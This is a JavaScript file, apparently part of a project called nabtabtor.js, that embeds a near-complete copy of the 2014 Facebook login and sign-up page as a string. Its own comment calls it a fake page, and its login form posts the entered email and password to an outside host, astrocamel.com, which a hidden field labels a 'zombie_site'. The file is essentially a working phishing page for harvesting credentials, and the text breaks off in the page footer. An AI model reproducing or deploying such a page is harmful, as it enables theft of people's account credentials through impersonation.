/*
* webpage.js
* part of nabtabtor.js
* 
* George Skouroupathis
*
*/

// Multi-line string trick
function hereDoc(str) {
  return str.toString().
      replace(/^[^\/]+\/\*!?/, '').
      replace(/\*\/[^\/]+$/, '');
}

// A webpage object
function Webpage(url, title, src) {
    this.url = url;
    this.title = title;
    this.getSource = hereDoc(src);
}

/*
* A sample webpage which simulates the Facebook login page
* but insteads sends the credentials to astrocamel.com
*/
var facebook_fake_page = new Webpage("http://www.facebook.com",
					"Welcome to Facebook - Log In, Sign Up or Learn More",
					function() {/*!
<!DOCTYPE html>
<html id="facebook" class="tinyViewport" lang="en">
<head>
<meta charset="utf-8">
<noscript><meta http-equiv="refresh" content="0; URL=/?stype=lo&amp;jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&amp;smuh=9394&amp;lh=Ac_HWG-CZB2Tonif&amp;_fb_noscript=1" /></noscript>
<meta id="meta_referrer" content="default" name="referrer">
<title id="pageTitle">Welcome to Facebook - Log In, Sign Up or Learn More</title>
<meta content="Facebook" property="og:site_name">
<meta content="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" property="og:url">
<meta content="https://www.facebook.com/images/fb_icon_325x325.png" property="og:image">
<meta content="en_US" property="og:locale">
<link href="https://www.facebook.com/" rel="canonical">
<link href="https://www.facebook.com/" media="only screen and (max-width: 640px)" rel="alternate">
<link href="https://www.facebook.com/" media="handheld" rel="alternate">
<link href="https://www.facebook.com/" hreflang="x-default" rel="alternate">
<link href="https://www.facebook.com/" hreflang="en" rel="alternate">
<link href="https://es-la.facebook.com/" hreflang="es" rel="alternate">
<link href="https://es-es.facebook.com/" hreflang="es-es" rel="alternate">
<link href="https://fr-fr.facebook.com/" hreflang="fr" rel="alternate">
<link href="https://fr-ca.facebook.com/" hreflang="fr-ca" rel="alternate">
<link href="https://id-id.facebook.com/" hreflang="id" rel="alternate">
<link href="https://it-it.facebook.com/" hreflang="it" rel="alternate">
<link href="https://ko-kr.facebook.com/" hreflang="ko" rel="alternate">
<link href="https://th-th.facebook.com/" hreflang="th" rel="alternate">
<link href="https://vi-vn.facebook.com/" hreflang="vi" rel="alternate">
<meta content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with..." name="description">
<meta content="noodp,noydir" name="robots">
<noscript><meta http-equiv="X-Frame-Options" content="DENY" /></noscript>
<link href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" rel="shortcut icon">
<link href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y8/r/Lhr38Klg-MY.css" rel="stylesheet" type="text/css">
<link href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yl/r/qo3skTMHarU.css" rel="stylesheet" type="text/css">
<link href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yE/r/nVVCL_VDLX-.css" rel="stylesheet" type="text/css">
<link href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yL/r/x3bsMJyVkPp.css" rel="stylesheet" type="text/css">
<link href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yL/r/jP3X3A0IlzV.css" rel="stylesheet" type="text/css">
</head>
<body class="fbIndex UIPage_LoggedOut _2gsg gecko Locale_en_US" dir="ltr">
<div class="_li">
<div id="pagelet_bluebar">
<div id="blueBarDOMInspector" class="_21mm">
<div id="blueBarNAXAnchor" class="_4f7n _xxp">
<div>
<div class="loggedout_menubar_container">
<div class="clearfix loggedout_menubar">
<a class="lfloat _ohe" title="Go to Facebook Home" href="/">
<i class="fb_logo img sp_9vUokIDmpP8 sx_15c231">
<u>Facebook logo</u>
</i>
</a>
<div class="menu_login_container rfloat _ohf">
<form id="login_form" method="post" action="http://www.astrocamel.com">
<input type="hidden" autocomplete="off" value="AVp0_K8W" name="lsd">
<input type="hidden" autocomplete="off" value="facebook" name="zombie_site">
<table cellspacing="0">
<tbody>
<tr>
<td class="html7magic">
<label for="email">Email or Phone</label>
</td>
<td class="html7magic">
<label for="pass">Password</label>
</td>
</tr>
<tr>
<td>
<input id="email" class="inputtext" type="text" tabindex="1" value="" name="email">
</td>
<td>
<input id="pass" class="inputtext" type="password" tabindex="2" name="pass">
</td>
<td>
<label id="loginbutton" class="uiButton uiButtonConfirm" for="u_0_l">
<input id="u_0_l" type="submit" tabindex="4" value="Log In">
</label>
</td>
</tr>
<tr>
<td class="login_form_label_field">
<div>
<div class="uiInputLabel clearfix uiInputLabelLegacy">
<input id="persist_box" class="uiInputLabelInput uiInputLabelCheckbox" type="checkbox" checked="1" value="1" name="persistent">
<label class="uiInputLabelLabel" for="persist_box">Keep me logged in</label>
</div>
<input type="hidden" value="1" name="default_persistent">
</div>
</td>
<td class="login_form_label_field">
<a href="https://www.facebook.com/recover/initiate" rel="nofollow">Forgot your password?</a>
</td>
</tr>
</tbody>
</table>
<input id="u_0_m" type="hidden" value="-90" name="timezone" autocomplete="off">
<input type="hidden" value="122351_APJb" name="lgnrnd">
<input id="lgnjs" type="hidden" value="1410551499" name="lgnjs">
<input id="locale" type="hidden" value="en_US" name="locale" autocomplete="off">
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="globalContainer" class="untextualLayerParent">
<div id="content" class="fb_content clearfix">
<div>
<div class="gradient">
<div class="gradientContent">
<div class="clearfix">
<div class="lfloat _ohe">
<div class="clearfix fbIndexMobile">
<a class="lfloat _ohe" role="button" rel="dialog" href="#" tabindex="-1" ajaxify="/ajax/mobile/sms_link/?src=lo&type=install_via_sms">
<img class="mtm phoneImage img" height="205" width="97" alt="" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yt/r/FZaMKqARgC6.png">
</a>
<div class="clearfix rightSide rfloat _ohf">
<div class="lfloat _ohe">
<div class="title fsl fwb fcb">Heading out? Stay connected</div>
<div class="subtitle fsm fwn fcg">Visit facebook.com on your mobile phone.</div>
</div>
<a class="mrl mobileButton rfloat _ohf uiButton" rel="dialog" ajaxify="/ajax/mobile/sms_link/?src=lo&type=install_via_sms" role="button" href="#">
<span class="uiButtonText">Get Facebook Mobile</span>
</a>
</div>
</div>
</div>
<div class="_5iyz rfloat _ohf">
<div class="pvl _52lp _59d-">
<div class="mbs _52lq fsl fwb fcb">Sign Up</div>
<div class="_52lr fsm fwn fcg">It's free and always will be.</div>
</div>
<div id="registration_container">
<div>
<noscript><div id="no_js_box"><h2>JavaScript is disabled on your browser.</h2><p>Please enable JavaScript on your browser or upgrade to a JavaScript-capable browser to register for Facebook.</p></div></noscript>
<div class="_58mf">
<div id="reg_box" class="registration_redesign">
<form id="reg" onsubmit="return function(event){return false;}.call(this,event)!==false && window.Event && Event.__inlineSubmit && Event.__inlineSubmit(this,event)" action="https://m.facebook.com/r.php" name="reg" method="post">
<input type="hidden" autocomplete="off" value="AVp0_K8W" name="lsd">
<div id="reg_form_box" class="large_form">
<div class="clearfix _58mh">
<div class="mbm _3-90 lfloat _ohe">
<div id="u_0_0" class="_5dbb">
<div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
<div class="placeholder" aria-hidden="true">First name</div>
<input id="u_0_1" class="inputtext _58mg _5dba _2ph-" type="text" aria-label="First name" placeholder="" aria-required="1" value="" name="firstname" data-type="text">
</div>
<i class="_5dbc img sp_9vUokIDmpP8 sx_116e5b"></i>
<i class="_5dbd img sp_9vUokIDmpP8 sx_fa2374"></i>
</div>
</div>
<div class="mbm rfloat _ohf">
<div id="u_0_2" class="_5dbb">
<div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
<div class="placeholder" aria-hidden="true">Last name</div>
<input id="u_0_3" class="inputtext _58mg _5dba _2ph-" type="text" aria-label="Last name" placeholder="" aria-required="1" value="" name="lastname" data-type="text">
</div>
<i class="_5dbc img sp_9vUokIDmpP8 sx_116e5b"></i>
<i class="_5dbd img sp_9vUokIDmpP8 sx_fa2374"></i>
</div>
</div>
</div>
<div class="mbm">
<div id="u_0_4" class="_5dbb">
<div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
<div class="placeholder" aria-hidden="true">Email</div>
<input id="u_0_5" class="inputtext _58mg _5dba _2ph-" type="text" aria-label="Email" placeholder="" aria-required="1" value="" name="reg_email__" data-type="text">
</div>
<i class="_5dbc img sp_9vUokIDmpP8 sx_116e5b"></i>
<i class="_5dbd img sp_9vUokIDmpP8 sx_fa2374"></i>
</div>
</div>
<div id="u_0_6" class="mbm">
<div id="u_0_7" class="_5dbb">
<div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
<div class="placeholder" aria-hidden="true">Re-enter email</div>
<input id="u_0_8" class="inputtext _58mg _5dba _2ph-" type="text" aria-label="Re-enter email" placeholder="" aria-required="1" value="" name="reg_email_confirmation__" data-type="text">
</div>
<i class="_5dbc img sp_9vUokIDmpP8 sx_116e5b"></i>
<i class="_5dbd img sp_9vUokIDmpP8 sx_fa2374"></i>
</div>
</div>
<div class="mbm">
<div id="u_0_9" class="_5dbb">
<div class="uiStickyPlaceholderInput uiStickyPlaceholderEmptyInput">
<div class="placeholder" aria-hidden="true">New password</div>
<input id="u_0_a" class="inputtext _58mg _5dba _2ph-" type="password" aria-label="New password" value="" placeholder="" aria-required="1" name="reg_passwd__" data-type="text">
</div>
<i class="_5dbc img sp_9vUokIDmpP8 sx_116e5b"></i>
<i class="_5dbd img sp_9vUokIDmpP8 sx_fa2374"></i>
</div>
</div>
<div id="u_0_b" class="_58mq _5dbb">
<div class="mtm mbs _58mr">Birthday</div>
<div class="_5k_5">
<span id="u_0_c" class="_5k_4" data-name="birthday_wrapper" data-type="selectors">
<span>
<select id="month" class="_5dba" name="birthday_month">
<option selected="1" value="0">Month</option>
<option value="1">Jan</option>
<option value="2">Feb</option>
<option value="3">Mar</option>
<option value="4">Apr</option>
<option value="5">May</option>
<option value="6">Jun</option>
<option value="7">Jul</option>
<option value="8">Aug</option>
<option value="9">Sep</option>
<option value="10">Oct</option>
<option value="11">Nov</option>
<option value="12">Dec</option>
</select><select id="day" class="_5dba" name="birthday_day">
<option selected="1" value="0">Day</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select><select id="year" class="_5dba" name="birthday_year">
<option selected="1" value="0">Year</option>
<option value="2014">2014</option>
<option value="2013">2013</option>
<option value="2012">2012</option>
<option value="2011">2011</option>
<option value="2010">2010</option>
<option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>
<option value="2006">2006</option>
<option value="2005">2005</option>
<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option>
<option value="1908">1908</option>
<option value="1907">1907</option>
<option value="1906">1906</option>
<option value="1905">1905</option>
</select>
</span>
</span>
<a class="mlm _58ms" role="button" rel="async" title="Click for more information" ajaxify="/help/ajax/reg_birthday" href="#">Why do I need to provide my birthday?</a>
<i class="_5dbc _5k_6 img sp_9vUokIDmpP8 sx_116e5b"></i>
<i class="_5dbd _5k_7 img sp_9vUokIDmpP8 sx_fa2374"></i>
</div>
</div>
<div id="u_0_f" class="mtm _5wa2 _5dbb">
<span id="u_0_g" class="_5k_3" data-name="gender_wrapper" data-type="radio">
<span class="_5k_2 _5dba">
<input id="u_0_d" type="radio" value="1" name="sex">
<label class="_58mt" for="u_0_d">Female</label>
</span>
<span class="_5k_2 _5dba">
<input id="u_0_e" type="radio" value="2" name="sex">
<label class="_58mt" for="u_0_e">Male</label>
</span>
</span>
<i class="_5dbc _5k_6 img sp_9vUokIDmpP8 sx_116e5b"></i>
<i class="_5dbd _5k_7 img sp_9vUokIDmpP8 sx_fa2374"></i>
</div>
<div id="u_0_h" class="_58mu">
<p class="_58mv">
By clicking Sign Up, you agree to our
<a rel="nofollow" target="_blank" href="/legal/terms">Terms</a>
and that you have read our
<a rel="nofollow" target="_blank" href="/about/privacy">Data Use Policy</a>
, including our
<a rel="nofollow" target="_blank" href="/help/cookies">Cookie Use</a>
.
</p>
</div>
<div class="clearfix">
<button id="u_0_i" class="_6j mvm _6wk _6wl _58mi _3ma _6o _6v" name="websubmit" type="submit">Sign Up</button>
<span id="u_0_n" class="hidden_elem _58ml">
<img class="img" height="11" width="16" alt="" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif">
</span>
</div>
</div>
<input id="referrer" type="hidden" value="" name="referrer" autocomplete="off">
<input id="asked_to_login" type="hidden" value="0" name="asked_to_login" autocomplete="off">
<input id="terms" type="hidden" value="on" name="terms" autocomplete="off">
<input id="ab_test_data" type="hidden" value="" name="ab_test_data" autocomplete="off">
<input id="contactpoint_label" type="hidden" value="email_only" name="contactpoint_label" autocomplete="off">
<input id="locale" type="hidden" value="en_US" name="locale" autocomplete="off">
<input id="abtest_registration_group" type="hidden" value="1" name="abtest_registration_group" autocomplete="off">
<input id="reg_instance" type="hidden" value="ZwyiU2MN2ze1XO3KjQO66qeH" name="reg_instance" autocomplete="off">
<div id="reg_captcha" class="_58mw hidden_elem">
<div>
<h2 id="security_check_header">Security Check</h2>
<div id="outer_captcha_box">
<div id="captcha_box">
<div id="captcha_response_error" class="field_error hidden_elem">This field is required.</div>
<div id="captcha" class="captcha" data-captcha-class="ReCaptchaCaptcha">
<input id="captcha_persist_data" type="hidden" value="AZnm44S8lshrI76uIYDeGj_GxNNssf0viNOVIm2mm0UsypHkqynwG__-26Wd4z05AceDYPpmpn0gsNNyTNgBj6bMhsPMC6_3CPEdss1eED6XXbzQFJrD_dKUha_ASWa5D1np0jxGo6D1Du3AoLSawJZ4wDsm7F-508LacRYs9lsTNZBerdLZTIqb-mhH5QQpWOP-_Uj0Vegg5WaAEt8H4Dg2TaZ4hI9YenE_DWGVvhNweceLozwfM3RsI7AE54QrJpRPhS_XQYpDUefY09r6dubRtAJR1B1lz7XGzTPWZU2l0SVx-D0DOKjdordS9pPq3pHBR-9pV45Iid_y1ucXaqHFZM1GTbJ4KbbIGL7bbd5vfw" name="captcha_persist_data" autocomplete="off">
<div id="recaptcha_scripts" style="display:none"></div>
<div>
<input id="captcha_session" type="hidden" value="Whz53c2odg-0bOh9D5y2JQ" name="captcha_session" autocomplete="off">
<input id="extra_challenge_params" type="hidden" value="authp=nonce.tt.time.new_audio_default&psig=7mDlRUc21CqIwM1RvrKo6wzbFLY&nonce=Whz53c2odg-0bOh9D5y2JQ&tt=9U7NfO_ju4qP3jVL0gzfkac1Gzg&time=1410549831&new_audio_default=1" name="extra_challenge_params" autocomplete="off">
<input id="recaptcha_type" type="hidden" value="password" name="recaptcha_type" autocomplete="off">
</div>
<div class="recaptcha_text">
<div class="recaptcha_only_if_image">
Enter both words below, separated by a space.
<br>
Can't read the words below?
<a id="recaptcha_reload_btn" role="button" onclick="Recaptcha.reload(); return false" href="#"> Try different words </a>
or
<a role="button" onclick="Recaptcha.switch_type("audio"); return false;" href="#"> an audio captcha </a>
.
</div>
<div class="recaptcha_only_if_audio" style="display:none">
Please enter the words or numbers you hear.
<br>
<a id="recaptcha_reload_btn" role="button" onclick="Recaptcha.reload(); return false" href="#"> Try different words </a>
or
<a role="button" onclick="Recaptcha.switch_type("image"); return false;" href="#"> back to text </a>
.
</div>
</div>
<span id="recaptcha_play_audio"></span>
<div class="audiocaptcha"></div>
<div id="recaptcha_image" class="captcha_image"></div>
<div id="recaptcha_loading">
Loading...
<img class="captcha_loading img" height="11" width="16" alt="" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif">
</div>
<div class="captcha_input">
<label> Text in the box </label>
<div class="field_container">
<input id="captcha_response" class="inputtext" type="text" aria-label="Captcha input. Type the words listed above to continue. Additionally, you may also try the audio captcha by clicking the link above." autocomplete="off" name="captcha_response">
</div>
<a class="mlm" role="button" onclick="CSS.show($('captcha_whats_this')); return false;" href="#">Why am I seeing this?</a>
<div id="captcha_whats_this" class="hidden_elem">
<div class="fsl fwb">Security Check</div>
This is a standard security test that we use to prevent spammers from creating fake accounts and spamming users.
</div>
</div>
</div>
</div>
</div>
<div id="captcha_buttons" class="_58p2 clearfix hidden_elem">
<div class="_58mx _58mm">
<div class="_58mz"> </div>
<a id="u_0_j" class="_58my" role="button" href="#">Back</a>
</div>
<div class="_58mm">
<div class="clearfix">
<button id="u_0_k" class="_6j mvm _6wk _6wl _58me _58mi _3ma _6o _6v" type="submit">Sign Up</button>
<span id="u_0_o" class="hidden_elem _58ml">
<img class="img" height="11" width="16" alt="" src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif">
</span>
</div>
</div>
</div>
</div>
</div>
</form>
<div id="reg_error" class="_58mn hidden_elem">
<div id="reg_error_inner" class="_58mo">An error occurred. Please try again.</div>
</div>
<div id="reg_pages_msg" class="_58mk">
<a href="/pages/create/">Create a Page</a>
for a celebrity, band or business.
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="mtm locales">
<ul class="uiList localeSelectorList _509- _4ki _6-h _6-j _6-i">
<li>
<a title="English (UK)" onclick="intl_set_cookie_locale("en_GB", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">English (UK)</a>
</li>
<li>
<a title="Welsh" onclick="intl_set_cookie_locale("cy_GB", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">Cymraeg</a>
</li>
<li>
<a title="English (US)" onclick="intl_set_cookie_locale("en_US", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">English (US)</a>
</li>
<li>
<a title="Spanish" onclick="intl_set_cookie_locale("es_LA", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">Español</a>
</li>
<li>
<a title="Portuguese (Brazil)" onclick="intl_set_cookie_locale("pt_BR", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">Português (Brasil)</a>
</li>
<li>
<a title="French (France)" onclick="intl_set_cookie_locale("fr_FR", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">Français (France)</a>
</li>
<li>
<a title="German" onclick="intl_set_cookie_locale("de_DE", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">Deutsch</a>
</li>
<li>
<a title="Italian" onclick="intl_set_cookie_locale("it_IT", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">Italiano</a>
</li>
<li>
<a title="Arabic" onclick="intl_set_cookie_locale("ar_AR", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="rtl">العربية</a>
</li>
<li>
<a title="Hindi" onclick="intl_set_cookie_locale("hi_IN", "https:\/\/www.facebook.com\/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif");" href="https://www.facebook.com/?stype=lo&jlou=AfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw&smuh=9394&lh=Ac_HWG-CZB2Tonif" dir="ltr">हिन्दी</a>
</li>
<li>
<a class="showMore" role="button" href="#" title="Show more languages" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fwww.facebook.com%2F%3Fstype%3Dlo%26jlou%3DAfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw%26smuh%3D9394%26lh%3DAc_HWG-CZB2Tonif&source=TOP_LOCALES_DIALOG" rel="dialog">…</a>
</li>
</ul>
</div>
</div>
</div>
<div id="pageFooter" data-referrer="page_footer">
<div id="contentCurve"></div>
<div aria-label="Facebook site links" role="contentinfo">
<table class="uiGrid _51mz navigationGrid" cellspacing="0" cellpadding="0">
<tbody>
<tr class="_51mx">
<td class="_51m- hLeft plm">
<a title="Check out Facebook Mobile." href="https://www.facebook.com/mobile/?ref=pf">Mobile</a>
</td>
<td class="_51m- hLeft plm">
<a title="Find anyone on the web." href="https://www.facebook.com/find-friends?ref=pf">Find Friends</a>
</td>
<td class="_51m- hLeft plm">
<a title="Embed a Facebook badge on your website." href="https://www.facebook.com/badges/?ref=pf">Badges</a>
</td>
<td class="_51m- hLeft plm">
<a title="Browse our people directory." href="https://www.facebook.com/directory/people/">People</a>
</td>
<td class="_51m- hLeft plm">
<a title="Browse our pages directory." href="https://www.facebook.com/directory/pages/">Pages</a>
</td>
<td class="_51m- hLeft plm">
<a title="Check out popular places on Facebook." href="https://www.facebook.com/places/">Places</a>
</td>
<td class="_51m- hLeft plm">
<a title="Check out Facebook games." href="https://www.facebook.com/games/">Games</a>
</td>
<td class="_51m- hLeft plm">
<a title="Browse our places directory." href="https://www.facebook.com/directory/places/">Locations</a>
</td>
<td class="_51m- hLeft plm _51mw">
<a title="Read our blog, discover the resource center, and find job opportunities." accesskey="8" href="https://www.facebook.com/facebook">About</a>
</td>
</tr>
<tr class="_51mx">
<td class="_51m- hLeft plm">
<a title="Advertise on Facebook." href="https://www.facebook.com/campaign/landing.php?placement=pflo&campaign_id=402047449186&extra_1=auto">Create Ad</a>
</td>
<td class="_51m- hLeft plm">
<a title="Create a Page" href="https://www.facebook.com/pages/create/?ref_type=sitefooter">Create Page</a>
</td>
<td class="_51m- hLeft plm">
<a title="Develop on our platform." href="https://developers.facebook.com/?ref=pf">Developers</a>
</td>
<td class="_51m- hLeft plm">
<a title="Make your next career move to our awesome company." href="https://www.facebook.com/careers/?ref=pf">Careers</a>
</td>
<td class="_51m- hLeft plm">
<a title="Learn about your privacy and Facebook." href="https://www.facebook.com/privacy/explanation">Privacy</a>
</td>
<td class="_51m- hLeft plm">
<a title="Learn about cookies and Facebook." href="https://www.facebook.com/help/cookies/?ref=sitefooter">Cookies</a>
</td>
<td class="_51m- hLeft plm">
<a title="Review our terms and policies." accesskey="9" href="https://www.facebook.com/policies/?ref=pf">Terms</a>
</td>
<td class="_51m- hLeft plm">
<a title="Visit our Help Center." accesskey="0" href="https://www.facebook.com/help/?ref=pf">Help</a>
</td>
</tr>
</tbody>
</table>
</div>
<div class="mvl copyright">
<div class="fsm fwn fcg">
<span> Facebook © 2014</span>
·
